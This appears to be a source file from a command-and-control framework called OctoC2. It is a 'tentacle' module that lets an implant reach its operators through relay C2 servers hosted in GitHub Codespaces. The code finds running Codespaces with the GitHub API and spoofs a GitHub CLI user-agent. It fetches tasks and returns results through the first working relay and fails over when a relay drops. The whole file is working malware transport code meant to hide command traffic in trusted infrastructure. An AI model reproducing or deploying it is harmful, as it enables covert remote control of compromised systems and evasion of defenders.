/**
 * OctoC2 — RelayConsortiumTentacle (Tentacle 12)
 *
 * Iterates a configured list of relay accounts (each running a C2 server
 * in a GitHub Codespace), discovers the active Codespace SSH endpoint
 * for each relay, and proxies checkin/submitResult through the first
 * working relay. Caches the active relay for the session lifetime.
 *
 * Each relay entry has an account, repo, and optional token. The tentacle
 * uses GrpcSshTentacle internally, setting the necessary env vars before
 * each connection attempt and restoring them afterward (safe in Bun's
 * single-threaded runtime).
 */

import type { CheckinPayload, Task, TaskResult, BeaconConfig, ITentacle, RelayConfig } from "../types.ts";
import { GrpcSshTentacle } from "./GrpcSshTentacle.ts";
import { Octokit } from "@octokit/rest";
import { createLogger } from "../logger.ts";

const log = createLogger("RelayConsortiumTentacle");

export class RelayConsortiumTentacle implements ITentacle {
  readonly kind = "relay" as const;

  private activeRelay: ITentacle | null = null;

  constructor(private readonly config: BeaconConfig) {}

  async isAvailable(): Promise<boolean> {
    return (this.config.relayConsortium?.length ?? 0) > 0;
  }

  /**
   * Factory method for inner tentacle — overridable in tests.
   */
  protected createInnerTentacle(relayConfig: BeaconConfig): ITentacle {
    return new GrpcSshTentacle(relayConfig);
  }

  /**
   * Discover the first running Codespace for this relay account/repo.
   * Returns the Codespace name (e.g. "user-repo-abc123"), or null if none found.
   */
  protected async discoverCodespace(relay: RelayConfig): Promise<string | null> {
    try {
      const token = relay.token ?? this.config.token;
      const octokit = new Octokit({ auth: token, userAgent: process.env.OCTOC2_USER_AGENT ?? "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" });
      const resp = await octokit.rest.codespaces.listInRepositoryForAuthenticatedUser({
        owner: relay.account,
        repo:  relay.repo,
        per_page: 10,
      });
      const running = resp.data.codespaces.find(cs => cs.state === "Available");
      return running?.name ?? null;
    } catch (err) {
      log.debug(`Relay ${relay.account}/${relay.repo}: codespace discovery failed — ${(err as Error).message}`);
      return null;
    }
  }

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    // Use cached relay if available
    if (this.activeRelay) {
      try {
        const tasks = await this.activeRelay.checkin(payload);
        return tasks;
      } catch (err) {
        log.warn(`Cached relay failed: ${(err as Error).message} — re-discovering`);
        await this.activeRelay.teardown().catch(() => {});
        this.activeRelay = null;
      }
    }

    // Try each relay in order
    for (const relay of this.config.relayConsortium ?? []) {
      const codespace = await this.discoverCodespace(relay);
      if (!codespace) continue;

      // Set env vars for GrpcSshTentacle (Bun is single-threaded — safe)
      const prevCodespace = process.env["SVC_GRPC_CODESPACE_NAME"];
      const prevUser      = process.env["SVC_GITHUB_USER"];

      process.env["SVC_GRPC_CODESPACE_NAME"] = codespace;
      process.env["SVC_GITHUB_USER"]          = relay.account;

      const relayBeaconConfig: BeaconConfig = {
        ...this.config,
        token: relay.token ?? this.config.token,
        repo: { owner: relay.account, name: relay.repo },
      };

      const tentacle = this.createInnerTentacle(relayBeaconConfig);

      try {
        const available = await tentacle.isAvailable();
        if (!available) {
          await tentacle.teardown().catch(() => {});
          continue;
        }
        const tasks = await tentacle.checkin(payload);
        this.activeRelay = tentacle;
        log.info(`Relay ${relay.account}/${relay.repo} (${codespace}) active`);
        return tasks;
      } catch (err) {
        log.warn(`Relay ${relay.account}/${relay.repo} failed: ${(err as Error).message}`);
        await tentacle.teardown().catch(() => {});
      } finally {
        // Restore env vars
        if (prevCodespace !== undefined) process.env["SVC_GRPC_CODESPACE_NAME"] = prevCodespace;
        else delete process.env["SVC_GRPC_CODESPACE_NAME"];
        if (prevUser !== undefined) process.env["SVC_GITHUB_USER"] = prevUser;
        else delete process.env["SVC_GITHUB_USER"];
      }
    }

    log.warn("All relay consortium entries exhausted — no active relay found");
    return [];
  }

  async submitResult(result: TaskResult): Promise<void> {
    if (!this.activeRelay) {
      throw new Error("RelayConsortiumTentacle: no active relay for submitResult");
    }
    await this.activeRelay.submitResult(result);
  }

  async teardown(): Promise<void> {
    if (this.activeRelay) {
      await this.activeRelay.teardown().catch(() => {});
      this.activeRelay = null;
    }
  }
}
